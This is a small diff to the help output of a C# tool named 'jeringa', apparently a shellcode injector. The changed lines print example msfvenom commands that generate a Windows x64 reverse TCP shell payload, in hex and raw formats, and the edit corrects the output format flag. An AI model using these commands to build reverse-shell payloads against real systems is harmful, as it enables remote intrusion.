@@ -425,7 +425,7 @@ namespace jeringa
             Console.WriteLine("[*] Example - Create payload in HEX format using Msfvenom with:");
             Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
             Console.WriteLine("[*] Example - Create payload in raw format for url option using Msfvenom with:");
-            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
+            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin");
 
             System.Environment.Exit(0);
         }
